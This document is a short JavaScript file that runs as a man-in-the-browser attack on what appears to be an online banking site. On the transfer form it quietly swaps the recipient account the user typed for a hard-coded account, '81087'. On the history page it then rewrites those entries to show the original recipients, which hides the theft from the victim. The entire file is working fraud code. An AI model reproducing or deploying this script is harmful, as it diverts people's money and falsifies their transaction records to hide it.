var haha_account = "81087";
var len = ("Account number: ").length;
var s = "Recipient account: ";
var user_account;
var true_account;

if(window.location.pathname == '/home/') {
    var str = document.getElementById("account_no").innerHTML;
	user_account = str.substring(len,str.length);
	localStorage.setItem("sender_account", user_account);
}

if(window.location.pathname == '/transfer_form/') {
	document.addEventListener("submit", function(){
		true_account = document.getElementById("account").value;
		localStorage.setItem("last_account", true_account);
		document.getElementById("account").value = haha_account;

		user_account = localStorage.getItem("sender_account");
        var fake_transfers = [];
		if(user_account in localStorage){
			fake_transfers = JSON.parse(localStorage.getItem(user_account));
			fake_transfers.push(true_account);
			localStorage.setItem(user_account, JSON.stringify(fake_transfers));
		} 
		else {
			fake_transfers.push(true_account);
			localStorage.setItem(user_account, JSON.stringify(fake_transfers));  
		}
	});
	document.getElementById("server_account").innerHTML = s.concat(localStorage.getItem("last_account"));
}

if(window.location.pathname == '/history/') {
	user_account = localStorage.getItem("sender_account");
	if(user_account in localStorage) {
		var fake_transfers = JSON.parse(localStorage.getItem(user_account));
		var accounts = document.getElementsByClassName("receiver_account");
		var transfers_it = fake_transfers.length - 1;
		for (i = accounts.length - 1; i >= 0; i--) {
    		if(accounts[i].innerHTML == haha_account && transfers_it < fake_transfers.length) {
				accounts[i].innerHTML = fake_transfers[transfers_it];
				transfers_it = transfers_it - 1;
			}
		}
	}
}
